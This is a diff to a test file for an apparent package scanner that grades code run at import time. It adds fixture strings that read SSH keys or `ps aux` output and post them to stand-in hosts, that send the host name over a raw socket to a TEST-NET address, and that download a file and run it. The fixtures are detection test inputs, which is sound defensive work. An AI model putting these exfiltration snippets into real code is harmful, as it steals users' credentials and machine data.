@@ -7,15 +7,18 @@ main, bin or exports reach, or a wheel's x/__init__.py — was judged only by
 the generic rules. Those files now get a weaker version, SC-IMPORT-RISK,
 narrower because this is where ordinary SDK code lives: reading one
 variable, listing variables with a prefix, contacting a cloud metadata
-address or naming its own service must not count. Only the whole
-environment serialized or a credential store read, next to a network call
-or a named exfiltration service in the same file, and a download piped into
-a shell by an exec call. MAJOR (WARN), except the shapes no library needs
-(audit P0, 0.1.7: import_time_severity): a download run through a shell,
-credentials sent to a named exfiltration service — CRITICAL
-(test_import_time_signals.py has the rest).
+address or naming its own service must not count.
 
-Payloads are inert: hosts are .invalid or 192.0.2.x (TEST-NET).
+Rule set 2.17 grades by what no library does when it is loaded
+(import_time_severity): the whole environment, a credential store or what
+local commands print about the machine, sent anywhere; local data sent to a
+data-capture service or to a hard-coded public IP address (a raw socket's
+too); a download run through a shell — CRITICAL. What a binary's installer
+does, a file downloaded and then run, stays MAJOR (WARN)
+(tests/scanner/test_supply_chain_signals.py's ImportTimeGradingTests and
+test_exfiltration_shapes.py have the rest).
+
+Payloads are inert: hosts are .invalid, 192.0.2.x or 203.0.113.x (TEST-NET).
 """
 
 import unittest
@@ -31,9 +34,21 @@ ENV_TO_COLLECTOR_PY = ("import os, json, urllib.request\n"
 SSH_KEY_TO_HOST_PY = ("import os, requests\n"
                       "requests.post('https://keys.invalid/k', "
                       "data=open(os.path.expanduser('~/.ssh/id_rsa')).read())\n")
-# 0.1.8: sent to a raw IP address instead, it is CRITICAL (a credential file
-# and an IP address: tests/scanner/test_exfiltration_shapes.py)
+# 0.1.8: sent to a raw IP address instead (a credential file and an IP
+# address: tests/scanner/test_exfiltration_shapes.py)
 SSH_KEY_TO_IP_PY = SSH_KEY_TO_HOST_PY.replace("https://keys.invalid/k", "http://192.0.2.1/k")
+PS_POSTED_PY = ("import subprocess, requests\nout = subprocess.check_output(['ps', 'aux'])\n"
+                "requests.post('https://collector.invalid/p', data=out)\n")
+HOST_TO_SOCKET_PY = ("import socket\ns = socket.socket()\ns.connect(('203.0.113.7', 4444))\n"
+                     "s.send(socket.gethostname().encode())\n")
+PS_POSTED_JS = ("const {execSync} = require('child_process');\nconst out = execSync('ps aux').toString();\n"
+                "fetch('https://collector.invalid/p', {method: 'POST', body: out});\n")
+HOST_TO_SOCKET_JS = ("const net = require('net'), os = require('os');\n"
+                     "const s = net.connect(8443, '203.0.113.7', () => s.end(os.hostname()));\n")
+DOWNLOAD_RUN_JS = ("const https = require('https'), fs = require('fs');\n"
+                   "const {execFileSync} = require('child_process');\n"
+                   "https.get('https://dl.example.invalid/tool', (r) => r.pipe(fs.createWriteStream('/tmp/tool'))\n"
+                   "  .on('finish', () => execFileSync('/tmp/tool', ['--version'])));\n")
 
 # Shapes of ordinary SDK and CLI code: none of these is a finding
 SDK_JS = {
@@ -85,23 +100,47 @@ class NpmImportTimeTests(unittest.TestCase):
     def test_a_file_main_reaches(self):
         res = scan_npm({"package.json": manifest(), "index.js": "require('./lib/telemetry');\n",
                         "lib/telemetry.js": EXFIL_JS})
-        self.assertEqual(import_risk(res), [("lib/telemetry.js", "MAJOR")])
-        self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        self.assertEqual(import_risk(res), [("lib/telemetry.js", "CRITICAL")])     # 2.17: the whole environment
+        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
         hit = issues(res, "SC-IMPORT-RISK")[0]
         self.assertEqual(hit["line"], 3)                     # the line that sends it (0.1.8: the flow's end)
         self.assertIn("runs when the package is loaded", hit["msg"])
 
-    def test_never_critical(self):
-        res = scan_npm({"package.json": manifest(main="dist/index.js"), "dist/index.js": EXFIL_JS})
+    def test_a_downloaded_file_run_stays_major(self):
+        # what a binary's installer does when it is first used
+        res = scan_npm({"package.json": manifest(main="dist/index.js"), "dist/index.js": DOWNLOAD_RUN_JS})
         self.assertEqual(import_risk(res), [("dist/index.js", "MAJOR")])
         self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
+        self.assertIn("downloads a file and then runs it", issues(res, "SC-IMPORT-RISK")[0]["msg"])
+
+    def test_what_commands_print_sent_anywhere(self):
+        # 2.17: no library posts `ps aux` when it is loaded
+        res = scan_npm({"package.json": manifest(), "index.js": PS_POSTED_JS})
+        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
+        self.assertIn("sends what local commands report about the machine over the network (ps)",
+                      issues(res, "SC-IMPORT-RISK")[0]["msg"])
+
+    def test_a_raw_socket_to_a_public_address(self):
+        # 2.17: a raw socket's hard-coded public address is an IP address; a
+        # private network's is a service on the user's own network
+        res = scan_npm({"package.json": manifest(), "index.js": HOST_TO_SOCKET_JS})
+        self.assertEqual(import_risk(res), [("index.js", "CRITICAL")])
+        self.assertIn("sends the machine's user or host name to an IP address (203.0.113.7)",
+                      issues(res, "SC-IMPORT-RISK")[0]["msg"])
+        private = HOST_TO_SOCKET_JS.replace("203.0.113.7", "10.0.0.5")
+        self.assertEqual(import_risk(scan_npm({"package.json": manifest(), "index.js": private})), [])
+        for addr in ("127.0.0.1", "192.168.1.10", "172.20.0.3", "169.254.169.254", "100.64.0.1", "0.0.0.0", "239.1.2.3"):
+            with self.subTest(addr):          # this machine, a LAN, link-local, carrier-grade NAT, multicast
+                self.assertEqual(repo.import_time_risk(HOST_TO_SOCKET_JS.replace("203.0.113.7", addr)), ([], None))
+        self.assertEqual(repo.import_time_risk(HOST_TO_SOCKET_PY.replace("203.0.113.7", "172.32.0.1"))[0],
+                         ["sends the machine's user or host name to an IP address (172.32.0.1)"])
 
     def test_a_bin_reading_an_ssh_key(self):
         res = scan_npm({"package.json": manifest(bin={"x": "bin/x.js"}),
                         "bin/x.js": ("const fs = require('fs');\n"
                                      "const k = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa');\n"
                                      "fetch('https://collector.invalid/k', {method: 'POST', body: k});\n")})
-        self.assertEqual(import_risk(res), [("bin/x.js", "MAJOR")])
+        self.assertEqual(import_risk(res), [("bin/x.js", "CRITICAL")])            # 2.17: a credential store
 
     def test_a_named_service_labels_a_send(self):
         # 0.1.8: a service a list names is where data goes, not a finding of
@@ -147,11 +186,14 @@ class WheelImportTimeTests(unittest.TestCase):
                           ("x-1.0.data/purelib/y/__init__.py", ENV_TO_COLLECTOR_PY)):
             with self.subTest(rel=rel):
                 res = scan_wheel({**WHEEL_META, rel: text})
-                self.assertEqual(import_risk(res), [(rel, "MAJOR")])
-                self.assertEqual(res["verdict"], "WARN", res["verdictReason"])
-        res = scan_wheel({**WHEEL_META, "evil.py": SSH_KEY_TO_IP_PY})
-        self.assertEqual(import_risk(res), [("evil.py", "CRITICAL")])
-        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+                self.assertEqual(import_risk(res), [(rel, "CRITICAL")])
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
+        for label, text in (("to an IP address", SSH_KEY_TO_IP_PY), ("commands' output", PS_POSTED_PY),
+                            ("a raw socket", HOST_TO_SOCKET_PY)):
+            with self.subTest(label):
+                res = scan_wheel({**WHEEL_META, "evil.py": text})
+                self.assertEqual(import_risk(res), [("evil.py", "CRITICAL")])
+                self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])
 
     def test_deeper_modules_are_not_checked(self):
         res = scan_wheel({**WHEEL_META, "x/__init__.py": "", "x/util.py": ENV_TO_COLLECTOR_PY})
@@ -174,7 +216,7 @@ class WheelImportTimeTests(unittest.TestCase):
         # it used to be judged by its install scripts alone)
         res = scan_sdist({"setup.py": "from setuptools import setup\nsetup(name='x')\n",
                           "x/__init__.py": ENV_TO_COLLECTOR_PY, "tests/test_x.py": ENV_TO_COLLECTOR_PY})
-        self.assertEqual(import_risk(res), [("x/__init__.py", "MAJOR")])
+        self.assertEqual(import_risk(res), [("x/__init__.py", "CRITICAL")])
 
 
 class WeakerThanTheInstallTestTests(unittest.TestCase):
